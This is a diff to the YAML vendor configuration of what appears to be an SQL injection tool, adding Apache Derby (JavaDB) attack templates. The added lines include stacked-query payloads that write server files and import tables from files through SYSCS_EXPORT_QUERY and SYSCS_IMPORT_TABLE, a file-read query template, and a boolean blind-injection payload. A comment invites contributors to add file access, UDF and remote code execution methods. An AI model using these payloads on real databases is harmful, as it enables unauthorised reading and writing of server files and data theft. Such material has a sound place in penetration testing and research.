@@ -68,6 +68,18 @@ resource:
     field: trim(coalesce(${field.value}, ''))
     concat: "|| '%7f' ||"
 
+ exploit: |
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+  
+  file:
+    write: ; create table %s(c varchar(9999)); insert into %s(c) values ('%s'); CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY('select * from %s', '%s',null,null,null)
+    createTable: ; create table %s(c varchar(9999)); CALL SYSCS_UTIL.SYSCS_IMPORT_TABLE(current schema,UCASE('%s'),'%s',null,null,null,0)
+    # file not complete
+    read: select '${enclose_value_sql}' || coalesce(c,'\n') || '\n${separator_qte_sql}0${enclose_value_sql}${trail_sql}' from %s ${limit}
+
 strategy:
  configuration:
   slidingWindow: |
@@ -101,6 +113,7 @@ strategy:
     - javadb
    orderByErrorMessage:
     - Column position '1337' is out of range for the query expression
+   vendorSpecific: 0=(select CASE WHEN ${test} THEN 0 ELSE 1%2bIDENTITY_VAL_LOCAL()END from sysibm.sysdummy1)
 
  union:
   indices: union select ${indices} from sysibm.sysdummy1
